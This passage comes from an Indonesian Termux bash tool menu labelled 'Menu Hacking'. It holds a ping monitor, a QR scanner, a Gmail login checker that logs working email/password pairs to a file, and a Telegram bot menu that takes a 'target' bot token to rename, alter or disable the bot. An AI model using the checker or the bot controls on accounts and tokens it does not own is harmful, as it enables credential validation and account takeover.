⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢿⣿⣿⣿⣿⣆⠈⢻⣿⣿⣿⠀
=====================================
    MONITORING KECEPATAN INTERNET    
=====================================
     Tekan Ctrl+C untuk keluar
------------------------------------- " | lolcat
echo ""
tput sc
while true; do
tput rc
tput ed
cek=$(ping -c 1 8.8.8.8 2>/dev/null | grep -oP 'time=\K[0-9.]+' | head -1)
if [ -n "$cek" ]; then
  if [ $(echo "$cek < 50" | awk '{print ($1 < 50)}') -eq 1 ]; then
res="Sangat Cepat ✅"
 war="\033[32;1m"
elif [ $(echo "$cek < 150" | awk '{print ($1 < 150)}') -eq 1 ]; then
 res="Cepat 👍"
 war="\033[34;1m"
elif [ $(echo "$cek < 300" | awk '{print ($1 < 300)}') -eq 1 ]; then
 res="Sedang ⚠️"
 war="\033[33;1m"
else
    res="Lambat ❌"
    war="\033[31;1m"
fi
echo -e "${war}Kecepatan Internet : ${cek} ms - ${res}"
echo -e "\033[90;1mLast update : $(date '+%H:%M:%S')"
else
echo -e "\033[31;1m❌ TIDAK ADA KONEKSI INTERNET!"
echo -e "\033[90;1mLast update : $(date '+%H:%M:%S')"
fi
sleep 1
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "34" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
cd $HOME
g="\033[32;1m"
r="\033[31;1m"
c="\033[36;1m"
y="\033[33;1m"
p="\033[35;1m"
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⠾⠿⠿⠯⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣾⠛⠁⠀⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⢀⣤⣾⣟⣛⣛⣶⣬⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠃⠀⠀⠀⠀⠀⣾⣿⠟⠉⠉⠉⠉⠛⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠋⠀⠀⠀⠀⠀⠀⠀⣿⡏⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⣤⣠⣤⣤⡤⡶⣶⢿⠟⠹⠿⠄⣿⣿⠏⠀⣀⣤⡦⠀⠀⠀⠀⣀⡄
⢀⣄⣠⣶⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠚⠋⠉⠀⠀⠀⠀⠀⠀⠈⠛⡛⡻⠿⠿⠙⠓⢒⣺⡿⠋⠁
⠉⠉⠉⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉" | lolcat
echo -e "${r}=================================================="
echo -e "${g}       GMAIL SENDER DETECTOR THXYZZ404"
echo -e "${r}=================================================="
echo -e "${c}"
read -p "Masukkan gmail : " tolol
echo -e "${y}"
read -p "Masukkan pw sender : " memek
echo ""
echo -e "${r}=================================================="
echo -e "${g}               CHECK PROSESING"
echo -e "${r}=================================================="
echo ""
python3 - <<EOF
import smtplib
import sys
from datetime import datetime
pengirim = "$tolol"
password = "$memek"
g="\033[32;1m"
r="\033[31;1m"
c="\033[36;1m"
y="\033[33;1m"
p="\033[35;1m"
b="\033[34;1m"
try:
    server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
    server.starttls()   
    print(f"{c} Development {g}: {y}Thxyzz404")
    server.login(pengirim, password)
    test_msg = f"""From : {pengirim}
To : {pengirim}
Subject : Test Sender - {datetime.now().strftime('%H:%M:%S')}
Status : SENDER AKTIF
Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    server.sendmail(pengirim, pengirim, test_msg)
    server.quit()
    print(f"{g}")  
    print("╔══════════════════════════════════════════╗")
    print("║            ✓ SENDER AKTIF ✓              ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{b}")
    print(f"📧 Email : {pengirim}")
    print(f"✅ Status : {g}Sukses_Check")
    print(f"{b}⏰ Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    with open("gmail_active.txt", "a") as f:
        f.write(f"[AKTIF] {pengirim} | {datetime.now()}\n")   
except smtplib.SMTPAuthenticationError:
    print(f"{r}")
    print("╔══════════════════════════════════════════╗")
    print("║          ✗ SENDER TIDAK AKTIF ✗          ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{p}")
    print(f"📧 Email : {pengirim}")
    print(f"❌ Error : Autentikasi gagal - Password salah/akun tidak valid")   
except smtplib.SMTPException as e:
    error_msg = str(e)
    print(f"{r}")
    print("╔══════════════════════════════════════════╗")
    print("║          ✗ SENDER TIDAK AKTIF ✗          ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{y}")
    print(f"📧 Email : {pengirim}") 
    if "Application-specific password required" in error_msg:
        print("❌ Error : Perlu App Password")
    elif "Username and Password not accepted" in error_msg:
        print("❌ Error : Login ditolak")
    else:
        print(f"❌ Error : {error_msg}")     
except Exception as e:
    print(f"{r}❌ ERROR : {str(e)}")
EOF
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "35" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
w='\033[37;1m'
b='\033[34;1m'
if ! command -v zbarimg &> /dev/null; then
    clear
    echo ""
    echo -e "${r}[ ${g}! ${r}]${c} Installing Packages..!!${w}"
    sleep 2
    echo -e "${n}"
    echo -e "${y}pkg install zbar file lolcat -y${w}"
    pkg install zbar file lolcat -y
else
    clear 
    echo ""
    echo -e "${g}Package sudah terinstall..!!"
    sleep 3
fi
clear
echo ""
echo "
 ██████╗ ██████╗ 
██╔═══██╗██╔══██╗
██║   ██║██████╔╝
██║▄▄ ██║██╔══██╗
╚██████╔╝██║  ██║
 ╚══▀▀═╝ ╚═╝  ╚═╝
Develop : Thxyzz404
Tools : QR Code Scanner
Platform : Termux" | lolcat
echo ""
read -p "Masukkan path gambar QR : " img
img=$(echo "$img" | sed "s/^['\"]//;s/['\"]$//")
echo ""
if [ ! -f "$img" ]; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File tidak ditemukan..!!"
    echo -e "${y}Cek path : $img"
    echo ""
fi
if ! file "$img" | grep -E -q "image|bitmap|JPEG|PNG|GIF"; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File bukan gambar yang valid..!!"
    echo ""
fi
echo -e "${r}[ ${g}INFO ${r}]${c} Memulai proses decode QR Code..!!"
echo -e "${r}[ ${g}FILE ${r}]${w} $img"
echo -e "${r}[ ${g}WAKTU ${r}]${c} $(date '+%H:%M:%S %d-%m-%Y')"
echo ""
echo -e "${r}[ ${g}SCAN ${r}]${y} Scanning QR Code..!!"
hasil=$(zbarimg --quiet --raw "$img" 2>/dev/null)
exit_code=$?
if [ $exit_code -eq 0 ] && [ -n "$hasil" ]; then
    echo -e "${r}[ ${g}SUKSES ${r}]${g} QR Code berhasil dibaca!"
    echo ""
    file_info=$(file -b "$img")
    echo -e "${r}[ ${g}JENIS ${r}]${c} $file_info"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        tipe="URL/Link"
        warna=$g
    elif [[ "$hasil" =~ @ ]] && [[ "$hasil" =~ \. ]]; then
        tipe="Email"
        warna=$c
    elif [[ "$hasil" =~ ^\+[0-9]+$ ]] || [[ "$hasil" =~ ^tel: ]]; then
        tipe="Nomor Telepon"
        warna=$b
    elif [[ "$hasil" =~ BEGIN:VCARD ]]; then
        tipe="Kontak (vCard)"
        warna=$y
    elif [[ "$hasil" =~ WIFI: ]]; then
        tipe="Koneksi WiFi"
        warna=$g
    elif [[ "$hasil" =~ ^[0-9]+$ ]] && [ ${#hasil} -gt 8 ]; then
        tipe="Kode/Nomor"
        warna=$w
    else
        tipe="Teks Biasa"
        warna=$w
    fi
    echo -e "${r}[ ${g}TIPE ${r}]${warna} $tipe"
    echo -e "${r}[ ${g}DATA ${r}]${w} $hasil"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        echo -e "${r}[ ${g}OPSI ${r}]${y} Mau buka link? (y/n) : ${w}"
        read -n 1 buka
        if [[ $buka == "y" || $buka == "Y" ]]; then
            echo ""
            echo -e "${r}[ ${g}BUKA ${r}]${c} Membuka link..!!"
            am start --user 0 -a android.intent.action.VIEW -d "$hasil" 2>/dev/null
            if [ $? -ne 0 ]; then
                echo -e "${r}[ ${g}LINK ${r}]${y} $hasil"
            fi
        fi
        echo ""
    fi
else
    echo -e "${r}[ ${g}GAGAL ${r}]${y} Tidak ada QR code terdeteksi"
    echo ""
    echo -e "${r}[ ${g}TIPS ${r}]${y} Penyebab gagal:"
    echo -e "${y}• Gambar blur/rusak"
    echo -e "${y}• QR code terlalu kecil"
    echo -e "${y}• Format tidak didukung"
    echo -e "${y}• Pencahayaan buruk"
    echo ""
    echo -e "${r}[ ${g}SOLUSI ${r}]${c} Coba gambar yang lebih jelas!"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "36" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
cd $HOME
c='\033[36;1m'
p='\033[35;1m'
g='\033[32;1m'
y='\033[33;1m'
r='\033[31;1m'
n='\033[0m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
BOLD_RED_BG='\033[101m'
show_error() {
    echo -e "${r}❌ $1${n}"
    echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali${n}"
    read
}
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀" | lolcat
echo ""
echo -e "${p} Pengembangan ${g}: ${c}By.Thxyzz404"
echo ""
echo -e "${c}====================================================="
echo -e "${r}     CONTROLL BOTZ TELEGRAM ALL,IN MENU CTRL"
echo -e "${c}====================================================="
echo -e "${r}     [ ${g}01 ${r}]${y} Ubah nama bio botz."
echo -e "${r}     [ ${g}02 ${r}]${y} Ubah nama user botz."
echo -e "${r}     [ ${g}03 ${r}]${y} Menu,in All control botz."
echo -e "${r}     [ ${g}04 ${r}]${y} Ubah profil botz telegram."
echo -e "${r}     [ ${g}05 ${r}]${y} Bunuh botz token."
echo -e "${r}     [ ${g}06 ${r}]${y} Kembali ke awall"
echo -e "${p}====================================================="
echo -e "${g}"
read -p ">>>>>>>> Masukkan pilihan anda : " kuy
case $kuy in
1|01)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram ${g}: ${y}"
read TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
if [[ $(echo "$response" | jq -r '.ok') == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_first_name=$(echo "$response" | jq -r '.result.first_name // "(Tidak ada)"')
    clear
    echo -e "${c}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====[ INFORMASI TOKEN BOT ]=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${r}${bot_id}${n}"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${r}@${bot_username}${n}"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${r}${bot_first_name}${n}"
    url_getbio="https://api.telegram.org/bot${TOKEN}/getMyShortDescription"
    response_bio=$(curl -s "$url_getbio")
    if [[ $(echo "$response_bio" | jq -r '.ok') == "true" ]]; then
        old_bio=$(echo "$response_bio" | jq -r '.result.short_description // "(Belum ada bio)"')
        echo -e "${g}─(${r}Bio Lama${g})─${y} : ${r}${old_bio}${n}"
    else
        echo ""
        echo -e "${r}⚠️ Gagal mengambil bio lama : $(echo "$response_bio" | jq -r '.description // "Unknown error"')${n}"
        old_bio=""
        echo ""
    fi
    new_bio=""
    while [[ -z "$new_bio" ]]; do
        echo -ne "\n${g}─(${r}?${g})─ Masukkan Bio Baru${g} : ${y}"
        read -r new_bio
        if [[ -z "$new_bio" ]]; then
            echo ""
            echo -e "${r}⚠️ Bio baru tidak boleh kosong.Coba lagi!${n}"
            echo ""
        fi
    done
    url_setbio="https://api.telegram.org/bot${TOKEN}/setMyShortDescription"
    response_set=$(curl -s -X POST "$url_setbio" -d "short_description=$new_bio")
    if [[ $(echo "$response_set" | jq -r '.ok') == "true" ]]; then
        echo -e "\n${g}[ ${c}✓ ${g}]${r} Bio Bot Berhasil Diubah Menjadi :${y} ${new_bio}${n}"
        echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali.${n}"
        read
    else
        echo ""
        show_error "Gagal mengubah bio bot : $(echo "$response_set" | jq -r '.description // "Unknown error"')"
        echo ""
    fi
else
    echo ""
    show_error "Token tidak valid atau API error : $(echo "$response" | jq -r '.description // "Unknown error"')"
    echo ""
fi
;;
2|02)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram${g} :${y} "
read -r TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
ok=$(echo "$response" | jq -r '.ok')
if [[ "$ok" == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_name=$(echo "$response" | jq -r '.result.first_name')
    clear
echo -e "${y}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====INFORMASI TOKEN BOT=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${g}─(${r}${bot_id}${g})─"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${g}─(${r}@${bot_username}${g})─"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${g}─(${r}${bot_name:-'(Tidak ada)'}${g})─"
    new_name=""
    while [[ -z "$new_name" ]]; do
        echo -ne "\n${g}─(${r}?${g})─${r} Masukkan Nama Baru${g} :${y} "
        read -r new_name
        if [[ -z "$new_name" ]]; then
            echo ""
            echo -e "${bg_red}${g}Ga Boleh Kosong Namanya${n}"
            echo ""
        fi
    done
    url_setname="https://api.telegram.org/bot${TOKEN}/setMyName"
    response_set=$(curl -s -X POST -d "name=${new_name}" "$url_setname")
    ok_set=$(echo "$response_set" | jq -r '.ok')
    if [[ "$ok_set" == "true" ]]; then
        echo -e "\n${g}─(${r}!${g})─${r} Nama Bot Berhasil Diubah Menjadi ${y}${new_name}${n}"
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}❌ Gagal mengubah nama bot : $response_set"
        echo ""
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
    fi
else
    clear 
    echo ""
    echo -e "${r}❌ Token tidak valid atau API error : $response"
    echo ""
    read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
fi
;;
  3|03)
CONFIG_FILE="id_target.txt"
LAST_UPDATE_ID=0
setup() {
    echo -e "${g}"
    read -p ">> Masukkan token target : " TOKEN
    TOKEN=$(echo "$TOKEN" | tr -d ' ')
    echo -e "${r}"
    read -p ">> Masukkan id target : " TARGET_ID
    TARGET_ID=$(echo "$TARGET_ID" | tr -d ' ')
    echo "TOKEN=$TOKEN" > $CONFIG_FILE
    echo "TARGET_ID=$TARGET_ID" >> $CONFIG_FILE
    if test_connection; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Token valid dan terhubung..!!"
        sleep 3 
        echo ""
        return 0
    else
        clear
        echo ""
        echo -e "${y}[✗] Token tidak valid atau koneksi gagal..!!"
        sleep 3 
        echo ""
        rm -f $CONFIG_FILE
        return 1
    fi
}
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source $CONFIG_FILE 
        echo ""
        echo -e "${n}Konfigurasi ditemukan."
        echo -e "${g}Token : ${TOKEN:0:10}"
        echo -e "${r}Target ID : $TARGET_ID"
        echo -e "${c}"      
        read -p "Apakah anda ingin mengganti token botz [ y/n ] : " use_old        
        if [ "$use_old" = "y" ] || [ "$use_old" = "Y" ]; then
            if test_connection; then
                clear 
                echo ""
                echo -e "${r}[ ${g}✓ ${r}] Menggunakan token lama..!!"
                sleep 3
                return 0
            else
                clear 
                echo ""
                echo -e "${r}[✗] Token tidak valid, perlu setup baru..!!"
                sleep 3 
                rm -f $CONFIG_FILE
                return 1
            fi
        else
            echo -e "${p}"
            read -p "Apakah Anda ingin mengubah token? [ y/n ] : " change_token          
            if [ "$change_token" = "y" ] || [ "$change_token" = "Y" ]; then
                clear 
                echo -e "${g}"
                read -p "Masukkan token baru : " new_token
                TOKEN=$(echo "$new_token" | tr -d ' ')
                sed -i "s/TOKEN=.*/TOKEN=$TOKEN/" $CONFIG_FILE
                if test_connection; then
                    clear 
                    echo -e "${r}[ ${g}✓ ${r}]${g} Token berhasil di ubah."
                    sleep 3
                    echo ""
                    clear
                else
                    clear 
                    echo ""
                    echo -e "${r} Token tidak valid."
                    sleep 3 
                    echo ""
                    clear 
                    rm -f $CONFIG_FILE
                    return 1
                fi
            fi            
            echo -e "${c}"
            read -p "Apakah Anda ingin mengubah id [ y/n ] : " change_target
            if [ "$change_target" = "y" ] || [ "$change_target" = "Y" ]; then
                clear 
                echo -e "${g}"
                read -p "Masukkan id baru : " new_target
                TARGET_ID=$(echo "$new_target" | tr -d ' ')
                sed -i "s/TARGET_ID=.*/TARGET_ID=$TARGET_ID/" $CONFIG_FILE
                clear 
                echo ""
                echo -e "${r}[ ${g}✓ ${r}]${c} Id berhasil di ubah."
                sleep 3 
                clear 
            fi
            source $CONFIG_FILE
            return 0
        fi
    fi
    return 1
}
test_connection() {
    local url="https://api.telegram.org/bot${TOKEN}/getMe"
    local response=$(curl -s -o /dev/null -w "%{http_code}" "$url" --max-time 10)   
    if [ "$response" -eq 200 ]; then
        return 0
    else
        return 1
    fi
}
display_banner() {
clear
echo "
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⡄
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠛⢙⣿⣿⠃
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⣿⣿⠿⠛⠋⠁⠀⠀⠀⣸⣿⣿⠀
        ⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⡿⠟⠛⠉⠀⠀⣠⣤⠞⠁⠀⠀⣿⣿⡇⠀
        ⠀⣴⣾⣿⣿⡿⠿⠛⠉⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⢸⣿⣿⠀⠀
        ⠸⣿⣿⣿⣧⣄⣀⠀⠀⣀⣴⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⣼⣿⡿⠀⠀
        ⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀⠀
        ⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⣀⣄⡀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣠⣾⣿⣿⣿⣦⡀⠀⠀⣿⣿⡏⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡿⠋⠈⠻⣿⣿⣦⣸⣿⣿⠁⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠈⠻⣿⣿⣿⠏ " | lolcat   
}
get_updates() {
    local url="https://api.telegram.org/bot${TOKEN}/getUpdates"
